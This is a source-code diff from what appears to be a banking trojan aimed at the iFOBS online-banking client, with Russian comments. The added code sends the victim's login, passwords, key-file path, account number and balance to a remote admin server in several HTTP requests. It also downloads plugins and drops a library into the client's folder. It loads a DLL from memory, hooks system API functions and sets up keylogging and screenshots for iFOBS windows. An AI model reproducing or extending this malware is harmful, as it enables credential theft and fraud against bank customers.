@@ -31,6 +31,8 @@ const DWORD HashClassLoginForm = 0x918D725B; /* TLoginForm.UnicodeClass*/
 
 const int MaxFindedControl = 6;
 
+int pluginInstalled = 0; //0 - плагин еще не грузили, 1 - плагин не установился, 2 - плагин успешно установлен
+
 struct ForFindControl
 {
 	HWND wnds[MaxFindedControl];
@@ -256,7 +258,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 	VideoLog log( "ifobs" );
 	TMemory text(512);
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	pwsprintfA( text.AsStr(), "Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys );
+	pwsprintfA( text.AsStr(), "DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys );
 	log.Send( 0, "Счет: '%s', баланс: '%s', банк: '%s'", dataFromPlug.acc, dataFromPlug.balans, dataFromPlug.nameBank );
 	log.Send2( 0, text.AsStr() );
 	if( GetAdminUrl(urlAdmin) )
@@ -265,18 +267,29 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		string azUser = GetAzUser();
 		char* urlBank = URLEncode(dataFromPlug.nameBank);
 		char* urlText = URLEncode(text);
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.acc, urlBank, urlText );
-		STR::Free(urlBank);
-		STR::Free(urlText);
+		char* urlText2 = URLEncode(resultGrab);
+
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.acc, urlBank );
 		THTTP H;
 		H.Get(request.AsStr());
+		DBG( "IFobs", "Отослали запрос 1: '%s'", request.AsStr() );
+
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
+		H.Get(request.AsStr());
+		DBG( "IFobs", "Отослали запрос 2: '%s'", request.AsStr() );
+
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText2 );
+		H.Get(request.AsStr());
+		DBG( "IFobs", "Отослали запрос 3: '%s'", request.AsStr() );
+
+		STR::Free(urlBank);
+		STR::Free(urlText);
+		STR::Free(urlText2);
 //		THTTPResponseRec Response;
 //		ClearStruct(Response);
 //		HTTP::Get( request.AsStr(), 0, &Response );
 //		HTTPResponse::Clear(&Response);
-		DBG( "IFobs", "Отослали запрос: '%s'", request.AsStr() );
 	}
-	MemFree(p);
 	return 0;
 }
 
@@ -305,71 +318,106 @@ void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, 
 		RunThread( SendBalans, 0 );
 }
 
-DWORD WINAPI PluginIFobs(LPVOID)
+BYTE* GetPlugin( const char* name, DWORD& size )
 {
-	VideoLog log( "ifobs" );
-	log.Send2( 0, "Загрузка плагина ifobs.plug" );
-	TPlugin ifobsPlug("ifobs.plug");
-	dataFromPlug.set = 0;
-	if( ifobsPlug.Download(true) )
+	string nameFile = Bot->MakeFileName( 0, name );
+	BYTE* data = File::ReadToBufferA( nameFile.t_str(), size );
+	if( data == 0 )
 	{
-		log.Send2( 0, "Плагин загружен" );
-		ifobsPlug.SetNotFree();
-		DBG( "IFobs", "Загрузили ifobs.plug" );
-
-		PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
-		if( InitFunc )
+		data = Plugin::Download( (char*)name, 0, &size, true );
+		if( data )
 		{
-			log.Send2( 0, "найдена InitFunc()" );
-			DBG( "IFobs", "есть InitFunc" );
-
-			if ( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
-				DBG( "IFobs", "BalanceCallBack set ok.");
-
-			if ( InitFunc((DWORD)&PutPasswords, "PasswordsCallBack") )
-				DBG( "IFobs", "PasswordsCallBack set ok.");
-
-			HookFunc* fp = funcsPlug;
-			bool ok = true;
-			while( fp->nameDll )
-			{
-				void* plugFunc = (void*)ifobsPlug.GetProcAddress(fp->nameFunc);
-				if( plugFunc )
-				{
-					log.Send( 0, "Найдена функция %s", fp->nameFunc );
-					DBG( "IFobs", "Найдена функция %s", fp->nameFunc );
-					DWORD addrRealFunc;
-					if( HookApi( fp->nameDll, fp->hashOrigFunc, plugFunc, (PVOID*)&addrRealFunc ) )
-					{
-						log.Send( 0, "Установлен хук на %s", fp->nameOrigFunc );
-						DBG( "IFobs", "Установлен хук на %s", fp->nameOrigFunc );
-						if( InitFunc(addrRealFunc, fp->nameOrigFunc) )
-						{
-							log.Send( 0, "InitFunc на %s", fp->nameOrigFunc );
-							DBG( "IFobs", "InitFunc на %s", fp->nameOrigFunc );
-							fp++;
-							continue;
-						}
-					}
-				}
-				ok = false;
-				break;
-			}
-			if( ok )
-			{
-				log.Send2( 0, "ifobs.plug успешно установлена" );
-				DBG( "IFobs", "ifobs.plug успешно установлена" );
-			}
-			else
-			{
-				log.Send2( 0, "ifobs.plug не установлена" );
-				DBG( "IFobs", "ifobs.plug не установлена" );
-			}
+			File::WriteBufferA( nameFile.t_str(), data, size );
 		}
 	}
+	return data;
+}
+
+static DWORD WINAPI LoadPluginIFobs(LPVOID)
+{
+	DBG( "IFobs", "Загрузка ifobs.plug" );
+	DWORD sizeIfobsPlug = 0;
+	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
+	DBG( "IFobs", "Загрузка RtlExt.plug" );
+	DWORD sizeRtlExt = 0;
+	BYTE* rtlExt = GetPlugin( "rtlext.plug", sizeRtlExt );
+	int res = 1;
+	if( dataIFobsPlug && rtlExt )
+	{
+		DBG( "IFobs", "Плагины загружены" );
+		
+		//пишем в папку клиента RtlExt.bpl, она необходима для работы плагина
+		char pathExtRtl[MAX_PATH];
+		m_lstrcpy( pathExtRtl, folderIFobs );
+		pPathAppendA( pathExtRtl, "RtlExt.bpl" );
+		if( File::WriteBufferA( pathExtRtl, rtlExt, sizeRtlExt ) == sizeRtlExt )
+		{
+			DBG( "IFobs", "Создали %s", pathExtRtl );
+			res = 2;
+		}
+		else
+			DBG( "IFOBS", "Не удалось создать %s", pathExtRtl );
+	}
 	else
-		DBG( "IFobs", "Не удалось загрузить ifobs.plug" );
+		DBG( "IFobs", "Не удалось загрузить плагины" );
+	pluginInstalled = res;
+	MemFree(dataIFobsPlug);
+	MemFree(rtlExt);
 	return 0;
+}
+
+static bool InitPlugin()
+{
+	bool ret = false;
+	DWORD sizeIfobsPlug = 0;
+	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
+	TMemoryDLL ifobsPlug(dataIFobsPlug);
+	ifobsPlug.SetNotFree();
+
+	PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
+	if( InitFunc )
+	{
+		DBG( "IFobs", "есть InitFunc" );
+
+		if ( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
+			DBG( "IFobs", "BalanceCallBack set ok.");
+
+		if ( InitFunc((DWORD)&PutPasswords, "PasswordsCallBack") )
+			DBG( "IFobs", "PasswordsCallBack set ok.");
+
+		HookFunc* fp = funcsPlug;
+		bool ok = true;
+		while( fp->nameDll )
+		{
+			void* plugFunc = (void*)ifobsPlug.GetProcAddress(fp->nameFunc);
+			if( plugFunc )
+			{
+				DBG( "IFobs", "Найдена функция %s", fp->nameFunc );
+				DWORD addrRealFunc;
+				if( HookApi( fp->nameDll, fp->hashOrigFunc, plugFunc, (PVOID*)&addrRealFunc ) )
+				{
+					DBG( "IFobs", "Установлен хук на %s", fp->nameOrigFunc );
+					if( InitFunc(addrRealFunc, fp->nameOrigFunc) )
+					{
+						DBG( "IFobs", "InitFunc на %s", fp->nameOrigFunc );
+						fp++;
+						continue;
+					}
+				}
+			}
+			ok = false;
+			break;
+		}
+		if( ok )
+		{
+			DBG( "IFobs", "ifobs.plug успешно установлен" );
+			ret = true;
+		}
+		else
+			DBG( "IFobs", "ifobs.plug не установлена" );
+	}
+	MemFree(dataIFobsPlug);
+	return ret;
 }
 
 //отсылка полного клиента на видео сервер
@@ -408,9 +456,7 @@ DWORD WINAPI SendIFobs(LPVOID)
 void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
-	VideoLog::Send( "ifobs", 21, "activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
-	RunThread( PluginIFobs, 0 );
 //	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
 //		MegaJump(SendIFobs);
 	VideoProcess::RecordPID( 0, "IFobs" );
@@ -423,7 +469,6 @@ bool Init( const char* appName )
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
-		VideoLog::Send( "ifobs", 20, "init" );
 		char* caption = "*iFOBS*ст*ац*я*";
 		char* caption2 = "*iFOBS*Regis*";
 		S->MakeScreenShot = true;
@@ -439,6 +484,19 @@ bool Init( const char* appName )
 		{
 			KeyLogger::AddFilterText(F, NULL, caption2 );
 		}
+
+		//запускаем в отдельном потоке загрузку и установку плагина, ждем не более 10с
+		pluginInstalled = 0;
+		RunThread( LoadPluginIFobs, 0 );
+		for( int i = 0; i < 100; i++ )
+			if( pluginInstalled > 0 )
+			{
+				if( pluginInstalled == 2 )
+					InitPlugin();
+				break;
+			}
+			else
+				pSleep(100);
 	}
 	return true;
 }
